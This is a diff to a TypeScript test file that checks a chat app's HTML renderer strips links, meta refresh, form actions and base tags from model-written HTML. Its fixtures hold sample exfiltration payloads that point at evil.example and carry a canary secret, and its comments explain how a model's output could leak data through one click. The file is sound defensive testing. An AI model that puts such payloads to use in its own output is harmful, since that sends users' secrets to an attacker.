@@ -20,7 +20,7 @@ import { describe, expect, it } from 'vitest';
 
 import { Markdown } from '@/ui/Markdown';
 import { MessageView } from '@/features/chat/MessageView';
-import { FRAME_CONTENT_SECURITY_POLICY, frameDocument } from '@/ui/frame';
+import { FRAME_CONTENT_SECURITY_POLICY, frameDocument, neutraliseNavigation } from '@/ui/frame';
 
 const CANARY = 'sk-live-EXFIL-CANARY';
 const render = (text: string): string => renderToStaticMarkup(createElement(Markdown, { text }));
@@ -131,5 +131,76 @@ describe('a model cannot make its rendered HTML fetch a remote URL', () => {
     // The two are not substitutes: the CSP does not revoke same-origin or stop
     // top-level navigation, and the sandbox does not stop a fetch.
     expect(frame()).toContain('sandbox=""');
+  });
+});
+
+/**
+ * The channel neither the sandbox nor the policy closes: one click.
+ *
+ * `sandbox=""` withholds top-level navigation and popups. It does not stop the
+ * frame navigating ITSELF, which is what `<a href>` does by default. CSP has
+ * nothing for it either — `navigate-to` never shipped, and `default-src 'none'`
+ * governs fetches. So a link the model wrote was a GET to an origin the model
+ * chose, with whatever it put in the query string, on web and on mobile.
+ */
+describe('a model cannot make one click into a request', () => {
+  it('is a real probe: the fragment really carries a live link before the rewrite', () => {
+    const fragment = `<a href="https://evil.example/x?d=${CANARY}">tap me</a>`;
+    expect(/href="https:/.test(fragment)).toBe(true);
+  });
+
+  it('strips the href, and keeps it visible as data the reader can inspect', () => {
+    const out = neutraliseNavigation(`<a href="https://evil.example/x?d=${CANARY}">tap me</a>`);
+    expect(out).not.toMatch(/\shref=/);
+    expect(out).toContain('tap me');
+    // Not deleted: the user can still read where the model wanted to send them.
+    expect(out).toContain('data-withheld-href');
+    expect(out).toContain('evil.example');
+  });
+
+  it('keeps a same-document fragment link, which goes nowhere', () => {
+    expect(neutraliseNavigation('<a href="#section">jump</a>')).toContain('href="#section"');
+  });
+
+  it('removes the zero-click version of the same thing', () => {
+    // A meta refresh navigates with no click at all, and would have been the
+    // sharper half of this defect.
+    const out = neutraliseNavigation(
+      '<meta http-equiv="refresh" content="0;url=https://evil.example/">x',
+    );
+    expect(out).not.toContain('http-equiv');
+    expect(out).not.toContain('refresh');
+  });
+
+  it('disarms forms, which are a click with a payload attached', () => {
+    const out = neutraliseNavigation(
+      `<form action="https://evil.example/c"><button formaction="https://evil.example/b?d=${CANARY}">go</button></form>`,
+    );
+    expect(out).not.toMatch(/\saction=/);
+    expect(out).not.toMatch(/\sformaction=/);
+  });
+
+  it('drops a <base>, which would redirect every relative URL in the fragment', () => {
+    expect(neutraliseNavigation('<base href="https://evil.example/">a')).not.toContain('base');
+  });
+
+  it('still renders what render_html is for', () => {
+    // The control. A rewrite that broke the feature would be "safe" and useless.
+    const out = neutraliseNavigation(
+      '<style>b{color:red}</style><div class="x"><b>Total</b> 42</div>' +
+        '<img src="data:image/png;base64,iVBORw0KGgo=">',
+    );
+    expect(out).toContain('<style>b{color:red}</style>');
+    expect(out).toContain('<b>Total</b> 42');
+    expect(out).toContain('class="x"');
+    expect(out).toContain('src="data:image/png;base64,iVBORw0KGgo="');
+  });
+
+  it('runs on the path the app actually uses', () => {
+    // frameDocument is what MessageView calls, so the rewrite has to be there
+    // and not merely exported.
+    const doc = frameDocument(`<a href="https://evil.example/?d=${CANARY}">x</a>`);
+    expect(doc).not.toMatch(/\shref="https/);
+    expect(doc).toContain('Content-Security-Policy');
   });
 });
